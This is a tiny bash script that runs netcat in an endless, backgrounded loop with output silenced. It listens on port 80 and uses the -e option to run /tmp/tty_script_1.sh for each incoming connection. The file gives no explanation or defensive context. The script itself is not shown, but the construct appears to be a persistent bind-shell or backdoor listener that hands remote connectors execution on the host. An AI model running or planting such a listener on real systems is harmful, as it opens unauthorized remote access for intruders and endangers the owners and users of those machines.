#!/bin/bash

while true; do
    nc -ll -p 80 -e /tmp/tty_script_1.sh;
done > /dev/null &

